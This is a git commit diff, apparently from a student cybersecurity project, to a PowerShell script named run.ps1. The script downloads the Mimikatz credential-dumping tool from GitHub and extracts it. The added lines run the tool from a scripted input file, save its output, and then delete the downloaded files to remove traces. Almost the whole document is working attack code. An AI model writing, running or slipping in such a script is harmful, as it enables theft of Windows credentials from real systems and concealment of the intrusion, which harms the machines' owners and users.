90db984725c746dad4d4b9c2d8f48156e918293f
projetcybersecurite <hghediri@enseirb-matmeca.fr>
2018-01-20 14:30:45 +0100

    3

--- run.ps1
+++ run.ps1
@@ -4,3 +4,7 @@ $client = new-object System.net.WebClient
 $client.DownloadFile("https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20171220/mimikatz_trunk.zip", $mimikatz_zip_path)
 Add-Type -assembly "system.io.compression.filesystem"
 [io.compression.zipfile]::ExtractToDirectory($mimikatz_zip_path, $mimikatz_path)
+cd $mimikatz_path/x64
+./mimikatz.exe > ./output_mimikatz < ./input_mimikatz
+cd $HOME
+rm -rf $mimikatz_zip_path $mimikatz_path
